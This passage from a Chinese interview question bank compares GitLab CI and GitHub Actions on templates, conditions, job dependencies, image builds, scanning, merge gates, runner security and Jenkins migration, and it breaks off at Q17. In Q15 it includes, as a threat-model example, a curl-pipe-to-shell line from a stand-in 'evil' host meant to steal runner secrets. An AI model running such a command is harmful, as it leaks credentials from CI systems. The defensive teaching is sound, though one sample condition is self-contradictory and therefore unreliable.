两边都提供复用，但心智模型不同，先讲清楚再选型。GitLab 是"文件级组合"：`include` 把外部文件按文本拼接进来（`include: project: 'ops/ci-templates' file: '/templates/backend.yml' ref: 'v1.2.0'` 是从模板仓库拉取并锁定版本），`extends` 做对象级继承——`build: extends: .build_base` 可以把基座 Job 的字段继承下来并局部覆盖。最佳实践是建立"中心模板仓库"：公共部分（node 构建、docker 构建、SAST 扫描、通知）都写成模板 Job 放进去，业务仓库只写 `include` + 自己的特殊字段，版本用 tag/ref 锁定。GitHub 是"执行块级复用"：composite action 复用"一组 Step"（定义在 `action.yml`，可接 `inputs`/`outputs`，像函数），reusable workflow 复用"一整个 Workflow"（定义在 `.github/workflows/xxx.yml`，声明 `on: workflow_call`，被其他仓库用 `uses: org/repo/.github/workflows/ci.yml@v1.2.0` 调用）。选型判断：命令片段（装依赖、跑 lint、发告警）→ composite action；整套 CI 编排（"标准后端流水线"）→ reusable workflow。两者都不支持 GitLab 那种"声明式合并到调用方文件"的体验，复用边界更清晰也更死板。几个真实经验：①版本锁定是红线——模板 ref 用 `main` 意味着一次坏改动全公司 CI 同时红，我经历过模板仓库改坏构建脚本、40 个仓库同一天全部失败的事故，之后统一 `ref: vX.Y.Z` + 升级前先在 1-2 个试点仓库验证；②参数别过度抽象——reusable workflow 或模板 Job 的 inputs 超过 10 个基本没人能维护，把"90% 仓库相同的部分"收进模板，把"差异部分"留给调用方写；③调试体验差异——GitLab include 拼接后可以在 CI 配置里看展开结果，GitHub 的 reusable workflow 调试要逐层打开，排障路径更长，排查问题要把子 workflow 的日志与调用方对齐。

**延伸考点：** GitLab `include: local` 与 `include: project` 的区别与各自的使用场景？GitHub reusable workflow 的 secrets 如何透传（`secrets: inherit` 的风险）？

---

### Q10. 条件执行：GitLab rules/only/except/needs 与 GitHub if/needs/continue-on-error，怎么表达"复杂条件"？

**问题：** 你们有一个 Job"只有 main 分支、且是 release tag 前缀 v、且手动确认后才部署"，还有一个 Job"测试失败也允许继续但要标记"。GitLab 和 GitHub 上分别怎么表达这些条件？`rules` 与 `if` 的求值逻辑有什么本质区别？

**期望加分项：**
- 讲清 GitLab `rules` 的核心语义：从第一个匹配的规则开始求值、按顺序短路，规则内 `if` 支持正则与预定义变量（`$CI_COMMIT_BRANCH`、`$CI_COMMIT_TAG`、`$CI_PIPELINE_SOURCE`）
- 讲清 GitHub `if` 的核心语义：基于 `github`/`env`/`vars`/`secrets` 上下文的表达式求值，`always()`、`success()`、`failure()`、`cancelled()` 状态函数
- 给出"部署条件"的两种写法对比：GitLab `rules: - if: $CI_COMMIT_TAG =~ /^v\d/ && $CI_COMMIT_BRANCH == "main" && $CI_PIPELINE_SOURCE == "web"`（web=手动触发）vs GitHub `if: startsWith(github.ref, 'refs/tags/v') && github.ref == 'refs/heads/main' && github.event_name == 'workflow_dispatch'`，注意 GitHub 一个 Job 的 `if` 不写 `github.event_name == 'push'` 就可能在 tag push 时也跑
- 失败容忍：GitLab `allow_failure`（Job 失败不阻塞 stage）+ `when: on_failure`；GitHub `continue-on-error: true` + 后续 Job 用 `if: always()` 或 `if: failure()` 接续
- 强调弃用语义：`only/except` 是 GitLab 旧语法（`rules` 优先、两者不能混用），GitHub 没有 `only/except`，一切用 `if`
- 实践佐证：条件写复杂后"永不触发"或"永远触发"的排障（CI lint 校验 `rules`、GitHub 表达式调试）

**减分项：**
- 用 `only/except` 写新流水线（已废弃），或 `rules` 与 `only` 混用
- 不知道 GitHub 的 `if` 是"表达式求值"、GitLab 的 `rules` 是"顺序短路匹配"，把两者当成一回事
- 部署 Job 的条件漏掉 `github.event_name` 检查，导致 tag push 触发部署
- 失败容忍与门禁混用：`continue-on-error` 的 Job 失败后还能不能阻断后续？说不清
- 无排障经验（条件不生效时怎么定位）

**解答：**

两者都是"条件表达"，但求值模型完全不同。GitLab 的 `rules` 是"规则列表 + 顺序短路"：按书写顺序逐条求值，命中第一条就执行该规则对应的 `when`（`on_success`/`manual`/`never` 等），后面不再看。常用预定义变量：`$CI_COMMIT_BRANCH`（分支名）、`$CI_COMMIT_TAG`（tag 名，非 tag 流水线为空）、`$CI_PIPELINE_SOURCE`（触发来源：push/merge_request_event/schedule/web/api 等）。"手动确认 + tag 前缀 v + main"在 GitLab 可以写成：
```yaml
deploy-prod:
  stage: deploy
  rules:
    - if: '$CI_PIPELINE_SOURCE == "web" && $CI_COMMIT_TAG =~ /^v\d/'
      when: manual
    - when: never
```
注意顺序：先匹配"手动触发且 tag 前缀 v"，命中才出现手动按钮，其余全部 `never` 隐藏。GitHub 的 `if` 是"表达式"：基于 `github.*`、`env.*`、`vars.*`、`secrets.*` 上下文与 `always()/success()/failure()/cancelled()` 状态函数，没有顺序短路。同样的条件写为 `if: github.event_name == 'workflow_dispatch' && startsWith(github.ref, 'refs/tags/v')`——注意 GitHub 里 tag push 与分支 push 是不同事件，若工作流触发条件里有 push，则 `github.event_name == 'push'` 时 tag push 也会进入，部署 Job 必须同时校验事件类型，这是 GitHub 上部署漏泄最常见的根因。失败容忍：GitLab 用 `allow_failure: true`（失败不标记 stage 失败，可继续）+ `when: on_failure`（前一 Job 失败才跑的收尾 Job）；GitHub 用 `continue-on-error: true`，但要记住：`continue-on-error` 的 Job 失败时，依赖它的 Job 若写 `needs` 且默认成功判定会失败，必须配合 `if: always()` 或 `if: ${{ !cancelled() }}`。实践建议：GitLab 的新流水线一律用 `rules`（`only/except` 在 GitLab 15+ 已废弃、且与 `rules` 混用会直接报错）；复杂条件写完后先在 CI Lint（GitLab 的流水线编辑器实时校验）和 GitHub 的 Actions 页面看"Job 被跳过时显示的跳过原因"，跳过原因正是判断条件写没写对的第一抓手。

**延伸考点：** GitHub 的 `if` 里如何判断"上游某个矩阵 Job 全部成功"？GitLab 的 `rules: changes`（按变更文件过滤）与 GitHub 的 `on: pull_request: paths` 各自适合什么场景？

---

### Q11. 并行与依赖：GitLab needs（DAG）与 GitHub needs，Job 依赖与失败处理怎么编排？

**问题：** 你们流水线里 build 之后要同时跑单元测试、集成测试、镜像扫描、覆盖率收集，最后部署。GitLab 用 stage 就能实现，为什么还需要 `needs`？GitHub 上全并行怎么收敛？Job 依赖链上某个环节失败，下游怎么处理？

**期望加分项：**
- 讲清 GitLab `needs` 的意义：默认 Stage 门禁下"下一个 Stage 要等本 Stage 全部 Job 完成"，`needs` 让 Job 精确依赖"我真正需要的那个 Job"，形成 DAG，跳过无关 Job 的等待（例如 test-e2e 只等 build，不用等 lint）
- 讲清 GitHub 的 `needs` 是唯一依赖表达方式：`needs: [build, lint]`，矩阵 Job 需要 `needs: matrix-job` 做聚合，跨 Job 传数据靠 artifacts 或 `needs.<id>.outputs`
- 失败传播语义对比：GitLab 的 needs 依赖 Job 失败 → 本 Job 被跳过（`when: on_success` 默认）；GitHub 的 needs Job 失败 → 本 Job 默认被 skip，但可以用 `if: ${{ !cancelled() }}`、`if: always()`、`if: failure()` 覆盖
- 讲清环检测与边界：GitLab 的 needs 不能跨 stage 往回指、不能成环（否则配置校验失败）；GitHub 的 needs 图必须是有向无环
- 实践佐证：用 needs 把 25 分钟流水线压到 12 分钟的真实案例；依赖 Job 失败后"通知 Job"如何用 `if: always()` 保证必跑

**减分项：**
- 以为 GitLab 有 stage 就不需要 needs，答不出"等待无关 Job"的时间浪费
- 不知道 GitHub needs 一个矩阵 Job 时拿到的产物/输出怎么聚合
- 失败处理只会说"会跳过"，说不出 always()/failure() 的精确语义
- needs 成环、跨 stage 反向依赖等非法配置的校验规则不清楚
- 无耗时优化量化佐证

**解答：**

两边的 `needs` 都解决同一件事：让 Job 只等待它真正依赖的东西，形成有向无环图（DAG）。GitLab 的场景是"stage 门禁太粗"：默认 `test` 阶段要等 `build` 阶段全部 Job 完成，如果 build 阶段有 6 个 Job（编译各服务），而 test-a 只依赖编译 A，它也要等另外 5 个，这就是浪费。用 `needs: ["build-a"]` 后 test-a 在 build-a 完成瞬间启动，吞吐立即提升。GitHub 更直接：没有 stage 概念，`needs` 是唯一编排手段，`needs: [build, lint]` 的 Job 在两者都成功后运行；矩阵场景要聚合，比如 18 个测试 Job 之后要"合并覆盖率"，写 `needs: [test-linux, test-mac, test-win]`（或对矩阵 Job 写 `needs: test`，GitHub 会把矩阵 Job 作为整体依赖，但下游拿不到矩阵各实例的 outputs，需要用 artifact 下载聚合）。失败传播是重灾区，两边默认行为都是"依赖失败 → 下游跳过"，区别在于覆盖手段：GitLab 靠 Job 级 `when: on_success/on_failure/always`（`when: always` 在 GitLab 里就是"依赖成败都跑"）；GitHub 靠 `if` 状态函数——`if: always()`（无论成败都跑）、`if: failure()`（仅失败时跑）、`if: ${{ !cancelled() }}`（取消之外都跑）。工程上最常用组合：部署 Job `needs: build`（默认成功才部署），通知/告警 Job 加 `if: always()`（无论成败都要通知），"失败清理" Job 加 `if: failure()`。边界规则也要清楚：GitLab 的 `needs` 只能指向前面的 stage 的 Job、禁止成环，配置校验会直接拒绝；GitHub 的 needs 图同样必须无环，且在 workflow 解析期就校验。还有两个高频坑：①GitLab 里 `needs` 的 Job 与 stage 内其他 Job 并行，但它拉 artifacts 默认只从 needs 指定的 Job 拉（`dependencies` 语义要同步理解）；②GitHub 中 Job 失败默认 workflow 也标记失败，如果想"collect 全部失败再停"，要用 `continue-on-error` + 汇总 Job `if: always()` 自己决定 workflow 最终状态。量化案例：一个 6 服务微服务仓库，全量 stage 门禁 25 分钟，改用 needs 让各服务测试独立推进后压到 12-14 分钟，构建排队也明显缓解。

**延伸考点：** GitLab `needs` 与 `dependencies` 的区别（一个管顺序、一个管制品）？GitHub 如何实现"前 3 个 Job 任意失败，主流程就放弃后续但保留告警"？

---

### Q12. 容器化构建：Docker build 在 CI 里怎么跑？DIND 与 kaniko/buildah 怎么选？

**问题：** 你们要在 CI 里构建并推送 Docker 镜像。在 GitLab（Runner 是 Docker executor）里直接 `docker build` 会报"无法连接 Docker daemon"，在 GitHub Actions 里也有类似问题。两边分别怎么解决？`Docker-in-Docker`、kaniko、buildah 各是什么场景用的？

**期望加分项：**
- 讲清根因：CI Job 里没有 Docker daemon 可用，需要"在容器里跑 Docker"的三种方案——DIND（privileged 容器内起 daemon）、rootless 的 kaniko/buildah（无需 daemon、直接构建镜像层）
- GitLab 侧方案：Docker executor 下用"docker:dind service + 环境变量 `DOCKER_HOST=tcp://docker:2375`"（需 Runner 配置 privileged=true），或用 kaniko（官方模板 `Kaniko` 是推荐方向，天然无特权）；`docker buildx` + 远程 builder 也是趋势
- GitHub 侧方案：官方推荐 `docker/build-push-action`（内部用 buildx + GitHub 托管的 daemon），矩阵多平台镜像（`platforms: linux/amd64,linux/arm64`）用 `docker/setup-buildx-action` + QEMU
- 缓存与推送：镜像层缓存（GitLab 用 cache/kaniko 的 `--cache-repo`，GitHub 用 `cache-from: type=gha`），推送到 GitLab Container Registry（`$CI_REGISTRY` 自动注入）或 GHCR（`${{ github.repository }}`）
- 安全注意：DIND 需要 privileged 容器，在共享 Runner 上是安全风险（见 Q15）；kaniko/buildah 无特权、更安全，是生产推荐
- 实践佐证：镜像构建耗时、多平台构建（arm64 构建慢的量化）、缓存命中率的实测数据

**减分项：**
- 只会说"用 dind"，不知道 privileged 的安全代价与替代方案
- 不知道 GitHub 的 `docker/build-push-action` 与 buildx、多平台构建的关系
- 镜像推送的认证（GitLab `$CI_REGISTRY_PASSWORD` / GitHub `GITHUB_TOKEN` + `actions/login-action`）答不清
- 镜像层缓存配置（`cache-from`/`--cache-repo`）缺失，每次全量构建
- 无耗时/缓存量化

**解答：**

根因一句话：CI 的 Job 跑在容器/VM 里，里面没有 Docker daemon，`docker build` 自然失败。三条主流路线：①DIND——在 Job 里再起一个 daemon（GitLab 用 `services: - docker:dind` + Job 里设 `DOCKER_HOST=tcp://docker:2375`，要求 Runner 的 Docker executor 开 `privileged`；GitHub 上 `docker/setup-buildx-action` 帮你接好托管 runner 的 daemon），体验最像本机 docker；②kaniko（Google 开源，GitLab 官方模板 `Kaniko` 直接可用）——无特权容器内直接构建镜像层并推送，是 GitLab 官方推荐方向，适合"共享 Runner 不给 privileged"的受限环境；③buildah——类似 kaniko，Podman 生态，无 daemon。GitHub 侧工程上不用关心 daemon 细节：标准组合是 `docker/setup-buildx-action`（初始化 buildx builder）+ `docker/login-action`（登录 GHCR：username 用 `${{ github.actor }}`、password 用 `${{ secrets.GITHUB_TOKEN }}`）+ `docker/build-push-action`（`push: true`、`tags: ghcr.io/${{ github.repository }}:${{ github.sha }}`），多平台用 `platforms: linux/amd64,linux/arm64` 加 QEMU 模拟，但注意 arm64 在模拟下构建很慢（约 2-3 倍时间），生产上应上原生的 arm64 runner 或用云构建集群。镜像层缓存：GitHub 用 `cache-from: type=gha, cache-to: type=gha,mode=max`（把层缓存存进 GitHub 的 blob 缓存，同仓库复用，命中后重复构建从 3-4 分钟降到 20-40 秒）；GitLab 上 kaniko 用 `--cache=true --cache-repo=<registry>/<cache>`，或 buildx 的 `--cache-from`/`--cache-to` 指到 registry。推送目标：GitLab 里 `$CI_REGISTRY`、`$CI_REGISTRY_USER`、`$CI_REGISTRY_PASSWORD` 自动注入，登录一行 `docker login $CI_REGISTRY -u $CI_REGISTRY_USER -p $CI_REGISTRY_PASSWORD`。安全提醒：DIND 的 privileged 模式相当于给 Job 根权限，在共享/自建 Runner 上跑不可信代码（PR）时绝对不能开；我实践中的默认方案是"受信任分支用 DIND 图快，fork/PR 统一切 kaniko/buildah 或仅构建不推送"。

**延伸考点：** 多平台镜像的 manifest list（`docker manifest` / buildx `--platform`）与"单平台推送不同 tag"的区别？镜像 tag 策略（`sha`、`latest`、`vX.Y.Z`）在生产发布里怎么选？

---

### Q13. 测试与质量集成：代码扫描、覆盖率、测试报告、Code Quality 怎么接入两平台？

**问题：** 你们想让 MR/PR 合入前自动完成：SAST 代码扫描、单元测试、覆盖率门槛检查、代码质量报告。GitLab 和 GitHub 分别有什么内置/生态方案？怎么让结果出现在 MR/PR 里？

**期望加分项：**
- GitLab 内置全家桶：SAST/Secret Detection/Dependency Scanning（`include` 官方模板一行接入）、`coverage:` 正则解析覆盖率、`coverage_report`（Cobertura 格式）、Code Quality（`include: template: Jobs/Code-Quality.gitlab-ci.yml` 出 MR widget）
- GitHub 生态方案：CodeQL（`github/codeql-action`，SAST + Secret Scanning）、`actions/checkout` + 测试框架后上传 JUnit 报告（`dorny/test-reporter` 或 `actions/upload-artifact` + 页面查看）、Codecov/Coveralls 等三方 action
- 覆盖率门槛：GitLab 在 MR 里比较"本次变更行覆盖率"；GitHub 没有原生，靠三方（Codecov 的 status check）或自写"覆盖率下降超过 X% 就 exit 1"的 Job
- 报告接入差异：GitLab 的 MR widget（`artifacts: reports: sast/coverage_report/codequality` 字段直接映射到 MR UI）；GitHub 靠三方 action 写 PR comment 或 check run
- 实践佐证：扫描误报治理（白名单/基线）、扫描耗时与流水线时长平衡、秘密扫描在"推上去的瞬间"发现泄露的流程

**减分项：**
- 只提"用 SonarQube"，说不出两平台原生/推荐的接入方式
- 不知道 GitLab 的 `artifacts: reports:` 与 MR widget 机制
- 覆盖率只有"报告"没有"门槛"，合入不看覆盖率变化
- 忽略扫描误报治理（白名单/降噪），扫描结果没人看形同虚设
- 无扫描接入后的真实数据（漏报/误报/耗时）

**解答：**

两平台思路差异明显：GitLab 是"平台内置 + YAML 一行接入"，GitHub 是"生态 action 拼装"。GitLab 侧，安全扫描三件套是官方模板一行 include：`include: - template: Security/SAST.gitlab-ci.yml - template: Security/Secret-Detection.gitlab-ci.yml - template: Security/Dependency-Scanning.gitlab-ci.yml`，跑完结果自动进 MR 的 Security widget；覆盖率用 `coverage: '/\(\d+\.\d+%\) covered/'` 正则从测试输出里解析，或用 `coverage_report: coverage_format: cobertura path: coverage/cobertura.xml`；Code Quality 模板（`Jobs/Code-Quality.gitlab-ci.yml`）产出 report 直接显示在 MR 里。关键机制是 `artifacts: reports:` 字段——SAST 的 `gl-sast-report.json`、coverage 的 cobertura、codequality 的 `gl-code-quality-report.json`，平台拿到这些文件就渲染成 MR widget，这是 GitLab 与 GitHub 体验差距最大的地方。GitHub 侧没有等价物，全拼 action：CodeQL 用 `github/codeql-action/init` + `analyze`（自动建 check run，结果在 Security tab 与 PR 内联注释）；JUnit 报告用 `dorny/test-reporter`（把测试结果发成 check run，失败直接标在 PR）；覆盖率门槛用 Codecov action（status check：`coverage decrease < 1%` 才允许 merge），或自己写一个 Job 读 cobertura 文件比较基线再 `exit 1`。实践要点：①门槛要"相对"不要"绝对"——绝对 80% 门槛会让老项目永远合不进去，改成"本次变更覆盖率 ≥ 项目基线 且下降不超过 1%"才现实；②扫描误报治理——GitLab 的 SAST 支持 `.gitlab/security-report-schema` 与 `sast:` 配置禁用规则，CodeQL 可以在 `queries` 里排除路径，一定要有人周期性 triage 误报，否则"狼来了"效应让团队无视所有告警；③Secret Detection 要配"泄露响应"：GitLab 的 Secret-Detection 可以在 MR 里直接标记，GitHub 的 push protection 能在推上去的瞬间拦截，两者都要有"发现后 revoke + 轮换"的流程（见 Q8）。耗时平衡：全量 SAST 扫描 3-5 分钟，建议放在 PR 阶段但只扫变更文件（GitLab `sast: variables: SEARCH_MAX_DEPTH`/GitHub CodeQL 自动只分析变更），避免阻塞每一次 push。

**延伸考点：** 覆盖率"只看本次变更行"与"看全项目"的门槛策略，你选哪种、为什么？GitLab `artifacts: reports` 还支持哪些报告类型（metrics、terraform 等）？

---

### Q14. 审查与门禁：MR/PR 的 required checks、approval，怎么让"流水线必须通过才能合并"？

**问题：** 你们仓库经常出现"测试没跑完就有人 merge 了"，或者"跑着旧代码的流水线也被拿来当合入门禁"。GitLab 和 GitHub 分别怎么设置"合入门禁"？"流水线通过"和"审批人通过"如何组合？

**期望加分项：**
- GitLab 侧：Settings → Merge requests → Merge checks（Pipelines must succeed）+ 批准规则（Approval rules，N 人/指定 role 批准），`merge_when_pipeline_succeeds`（管道成功即合并）
- GitHub 侧：Branch protection rule（Settings → Branches）勾选 Require status checks（把 CI Job 名/check name 加进 required checks）、Require approvals（1-2 人）、Require review from Code Owners
- 讲清"required check"的判定粒度：GitHub 要求"指定名字的 check 必须成功"，如果 CI Job 名变了或矩阵展开名字变了，规则会失配（这是最常见的"门禁失效"坑）
- 组合策略：要求"最新 commit 的流水线"（GitHub 的 Require branches to be up to date 防止跑旧代码的 check 通过后又被推送新代码）
- 实践佐证：合并门禁失效事故（check 改名/跳过）、approval 与 code review 分离、紧急 hotfix 豁免流程

**减分项：**
- 只知道"在 Settings 里勾一下"，说不出 required check 匹配机制与改名失配的坑
- 不讨论"最新 commit 校验"（up to date），旧 check 通过也能 merge 的漏洞
- 审批与流水线门禁混为一谈（approval 是人的门禁，check 是机器的门禁）
- 无豁免/降级流程（hotfix 需要跳过门禁时怎么走）导致长期破坏流程
- 无事故佐证

**解答：**

门禁分两层：机器层（流水线/status check）与人层（approval/review），两平台都要求"两层都过才能 merge"。GitLab：Settings → Merge requests → Merge checks 里勾 `Pipelines must succeed`（默认还要求流水线针对最新 commit），Approvals 里设规则——如"maintainer 及以上 2 人批准，Code Owner 必须批准"；配合 `merge_when_pipeline_succeeds`（点了 Merge 后等流水线绿了自动合）体验很好。GitHub：Settings → Branches 给 `main` 建 Branch protection rule，勾选：①`Require a pull request before merging`（默认）；②`Require status checks to pass before merging`——注意这里要精确列出 check 名字（比如 CI 里 Job 名 `test` 或 `build-push-action` 产生的 check），GitHub 按"check run 的名字"匹配，一旦你改了 workflow 文件名、Job 名，或矩阵展开成 `test (18, ubuntu-latest)` 这种带维度的名字，规则就失配，门禁静默失效——这是 GitHub 上最隐蔽的门禁坑，我经历过一次"required check 配了 `test`，后来矩阵化后变成了 `test (20, linux)`，三天没人发现门禁其实没了"；③`Require branches to be up to date before merging`——防止"check 在旧 commit 上通过、之后又 push 了新代码"依然能合，勾上后新 push 会 invalidate 旧 check、要求重跑；④`Require approvals`（1-2 人）+ `Require review from Code Owners`（涉及核心目录的变更必须 owner 过）。组合策略建议：把"自动门禁"（required checks）当硬底线，"人工审批"（approval）当风险开关——常规功能只要求 checks 过 + 1 人 approve；生产相关目录（`deploy/`、`infra/`）加 Code Owners 必须 review；release 分支可以再叠加 deploy 环境的 required reviewers（见 Q7）。豁免流程必须存在且被审计：hotfix 临时降级 approval 数量要走"值班 on-call + 事后复盘"，而不是把保护规则永久调松——团队常见退化就是"这次紧急直接去掉规则"，之后再也加不回来。GitHub 还有 `CODEOWNERS` 文件与 approval 联动、dismiss stale reviews 等细节，能答出这些说明你真的在线上管过 merge 流程。

**延伸考点：** GitHub required check 里"工作流级 check"（如 `build`）与"Job 级 check"的命名关系，矩阵化后怎么维护不破？GitLab 的批准规则按"成员 role"与按"具体人"各自适合什么团队？

---

### Q15. 安全与隔离：Runner 上跑不可信代码、供应链攻击，怎么防？

**问题：** 你们开了 fork 模式，任何人都能提交 PR。有人提交了一个 PR，流水线在你们的 self-hosted Runner 上跑了——他只要在 `script` 里写 `curl ... | sh` 就能拿到 Runner 上所有的 secrets。你怎么防？GitLab 和 GitHub 各有什么机制？

**期望加分项：**
- 讲清威胁模型：fork/不可信 PR 的代码在"可信 Runner + 全量 secrets"环境里执行 = 任意代码执行 + 密钥泄露，这是 CI/CD 安全的第一大风险
- GitLab 侧机制：`rules: if: $CI_PIPELINE_SOURCE == "merge_request_event"` 区分来源；runner 设为 `protected`；`CI_JOB_JWT`/`ID tokens` 限制令牌权限；`variables` 加 protected 属性；对 fork 的 MR 不提供 secrets（平台自动处理）
- GitHub 侧机制：pull_request 的 fork 事件默认对 fork 不暴露 secrets（`pull_request` 事件下 secrets 默认不可用，要用 `pull_request_target` 才会暴露——而这个事件正是供应链攻击的重灾区）、`if: github.event.pull_request.head.repo.forked == false` 或 `github.repository == github.event.pull_request.head.repo.full_name` 区分
- 供应链攻击面：依赖投毒（`npm install` 被篡改的包）、第三方 action 投毒（GitHub 上 `uses: 不熟作者/action@main`）、git 历史里的 secret
- 实践做法：Dependabot/renovate 自动更新 + 依赖锁文件 + `npm audit`/`trivy` 扫描；action 锁定到 commit SHA 而不是 tag；`permissions:` 最小化 `GITHUB_TOKEN` 权限
- 强调"隔离执行"：fork PR 的代码跑在隔离的临时 runner/容器里（GitLab 用 `protected` + 无 secrets 的 Job；GitHub 有 `pull_request_target` 与 `pull_request` 分工：前者有 secrets 但只跑"不执行 PR 代码"的 step，后者无 secrets 可执行任意代码）

**减分项：**
- 不知道 fork PR 默认有没有 secrets（GitHub 上 `pull_request` 与 `pull_request_target` 的 secrets 差异是必考点，答错直接扣分）
- 以为"用 self-hosted runner 就安全"，不讨论不可信代码的威胁模型
- 第三方 action 用 tag 引用且不校验，供应链攻击防线为零
- `GITHUB_TOKEN` 权限给到 write-all，无最小化意识
- 无攻击面/事件佐证

**解答：**

威胁模型必须建立：在 CI 里执行不可信代码 = 把 runner 的 secrets 交给攻击者。fork 的 PR 代码在 self-hosted runner 上跑，`script` 里一行 `curl -s https://evil/x.sh | sh` 就能把 `$DB_PASSWORD` 等所有环境变量外带出去。两个平台的防线层级不同。GitLab：平台不自动区分 fork 与内部 MR，需要自己写 `rules`：`if: $CI_PIPELINE_SOURCE == "merge_request_event" && $CI_MERGE_REQUEST_SOURCE_BRANCH_PROTECTED == "false"` 之类的条件把不可信来源的 Job 降级（无 secrets、只跑 lint）；Runner 设 `protected`（只有 protected 分支/tag 的流水线能调度）；关键 secrets 一律 `protected` 属性，非受信流水线拿不到。GitHub：机制更体系化——`pull_request` 事件下（包括 fork PR），平台默认不注入任何 secrets，这是安全基线；但很多人为了"PR 里展示部署预览"会用 `pull_request_target`，这个事件跑的是**目标仓库（main）的代码**、且有 secrets——正确用法是它只触发一个"调用已发布 action、不执行 PR 内容"的 Job，一旦把 checkout 换成 PR 分支并执行其代码，攻击者直接在 main 上下文里跑任意代码，这是 GitHub 供应链攻击头号入口。另一个防线是 `if` 条件：`if: github.event.pull_request.head.repo.forked == false` 让受信 Job 只给同仓库 PR。供应链防护三件事：①依赖层——锁文件 + 自动更新（Dependabot/Renovate）+ 依赖扫描（`trivy`/`npm audit`）卡在 CI 里；②action 层——第三方 action 锁 `@<commit-sha>` 而不是 `@v4`（tag 可被仓库所有者改指向，SHA 不可变），`uses: docker/build-push-action@<40字符sha>`；③令牌层——给每个 Job 写 `permissions: contents: read, packages: read` 之类的最小权限，GitHub 的 `GITHUB_TOKEN` 默认 write-all 是隐患，GitLab 用 OIDC（`id_tokens`）替代长期静态凭据。最后是执行隔离：我的实践原则是"受信分支全能力，不可信 PR 无 secrets + 隔离执行（DIND 特权/kaniko 都不给）"，并且关键环境的部署永远不给 fork 触发路径。真实案例：某团队在 GitHub 上被 fork PR 用 `pull_request_target` + 篡改的 `dist` 文件偷走了 `AWS_SECRET_ACCESS_KEY`，就是"预览部署"需求与安全边界的典型踩坑。

**延伸考点：** `pull_request_target` 与 `pull_request` 分别适合什么场景，如何安全地"给 fork PR 跑部署预览"？GitLab 的 `id_tokens`/OIDC 怎么替代云厂商静态密钥？

---

### Q16. 迁移实践：从 Jenkins 迁移到 GitLab CI 或 GitHub Actions，步骤与坑是什么？

**问题：** 你们 Jenkins 上有 60 条自由风格/流水线 Job，插件越装越多、维护的人离职了没人敢动。老板让迁移到 GitLab CI 或 GitHub Actions，你会怎么规划？最大的坑是什么？

**期望加分项：**
- 分阶段迁移方法论：盘点（Job 分类：构建/测试/发布/定时/手动）→ 选目标平台 → 试点（1-2 个仓库跑通"构建→测试→发布"）→ 模板化 → 批量迁移 → 双跑对比 → 下线 Jenkins
- 讲清迁移的本质是"重写而不是翻译"：Jenkins 的 Groovy pipeline、插件（每个插件一套 DSL）没有一对一映射，按"能力"重新设计流水线（stage 划分、制品、门禁）
- 重点坑：Jenkins 的全局共享库（shared library）要翻译成 GitLab include/extends 或 GitHub composite/reusable；Jenkins 节点（agent label）→ GitLab tags / GitHub self-hosted labels；Jenkins 凭据（credentials）→ 平台变量/secrets；Jenkins 定时构建 → schedule；Jenkins 参数化构建 → workflow_dispatch inputs / GitLab 手动 Job
- 双跑期策略：同一仓库同时出 Jenkinsfile 与 .gitlab-ci.yml，对比产物 hash 与部署结果，稳定后再切流量；制品/发布记录要有可比对基线
- 团队能力建设：统一模板、文档、lint 校验 CI 配置（GitLab 有 pipeline editor + lint API，GitHub 有 actionlint）
- 实践佐证：迁移耗时/收益量化（如迁移 60 条 Job 用 6-8 周、构建时间中位数从 18 分钟降到 7 分钟）

**减分项：**
- 打算"把 Jenkinsfile 机械翻译成 YAML"，不了解两平台能力边界差异
- 没有试点与双跑阶段，直接全量切，出问题无回退
- 忽略 Jenkins 特有的东西：共享库、agent 标签、凭据、插件行为（如并发构建锁、邮件通知）
- 不评估 Jenkins 上"一次性脚本"（没人知道在干什么的历史 Job）
- 无迁移数据（Job 数、人周、耗时对比）

**解答：**

迁移不是翻译，是"按能力重新设计"，这是第一原则。Jenkins 的 Groovy + 插件 DSL 与 GitLab/GitHub 的声明式 YAML 没有字段级映射，正确的做法是先把 60 条 Job 盘点成能力清单（构建语言/制品类型、测试命令、发布目标、定时任务、手动审批、依赖关系），再按目标平台重新编排。规划分五步：①盘点与分类——把 Job 分成"核心发布链路"（build→test→deploy）与"杂项"（定时巡检、一次性脚本），杂项里"没人知道干什么"的直接标记待删；②选型——私有代码选 GitLab CI（仓库+CI 一体），公开/开源选 GitHub Actions，还要评估分钟数预算与自建 runner（见 Q20）；③试点——挑 1-2 个典型仓库，从零写目标平台流水线，跑通"构建→测试→推送制品→部署 staging"；④模板化与批量迁移——把试点积累的公共模式抽成模板（GitLab include 模板仓库 / GitHub reusable workflow），其余仓库按模板套；⑤双跑与下线——双跑期新流水线与 Jenkins 同时跑，对比制品（同一个 commit 构建出的产物 hash 应一致）和部署结果，稳定 2-4 周后关 Jenkins。重点坑清单：①Jenkins 共享库（`vars/*.groovy` 函数）要翻译成 include/extends 或 composite action，不要尝试把 Groovy 逻辑照搬进 YAML（YAML 没有循环/函数，复杂逻辑要么拆 Job 要么写独立脚本放进仓库）；②agent 标签 ↔ tags/runs-on 标签的映射要重新设计（Jenkins 一个 label 可能含多种环境，拆开打标）；③凭据迁移——Jenkins credentials（username/password/ssh key/secret file）逐条对应到平台变量/secrets，**迁移期间必须重新生成密码而不是复制旧值**（旧值可能已泄露）；④参数化构建 → GitHub `workflow_dispatch.inputs` / GitLab 手动 Job + `variables`；⑤并发控制——Jenkins 插件做的"同一 Job 不并发"（`disableConcurrentBuilds`）在 GitLab 用 `resource_group`、GitHub 用 `concurrency` 组复刻，忘了这条迁移后会出现部署互相覆盖事故；⑥通知——Jenkins 邮件插件 → 平台原生通知 + IM webhook（钉钉/Slack）集成。收益量化参考：60 条 Job 由 1 名工程师 6-8 周完成（含模板与文档），构建中位数 18 分钟 → 7 分钟（并行度+缓存），"无人敢动"的维护风险直接归零。迁移最大的隐性成本是历史行为契约——Jenkins 上那些"虽然不知道为什么但没它不行"的 Job，盘点阶段要逐个找 owner 确认，这是双跑期存在的真正理由。

**延伸考点：** 迁移期间"同一条发布流程两套实现"，如何保证发布结果一致（产物 hash、部署目标）？Jenkins 的"构建产物归档"（build artifacts）在目标平台用什么方案承接？

---

### Q17. GitOps 集成：流水线怎么和 Argo CD / Flux 配合？"构建推送镜像"之后发生什么？

**问题：** 你们引入 GitOps 用 Argo CD 做 K8s 部署，CI 流水线的职责边界变了——以前"构建+部署一把梭"，现在 CI 只负责把镜像推上去，部署由 Argo CD 拉取。这个配合在 GitLab CI 和 GitHub Actions 上分别怎么落地？"镜像推送"到"应用更新"之间怎么衔接？

**期望加分项：**
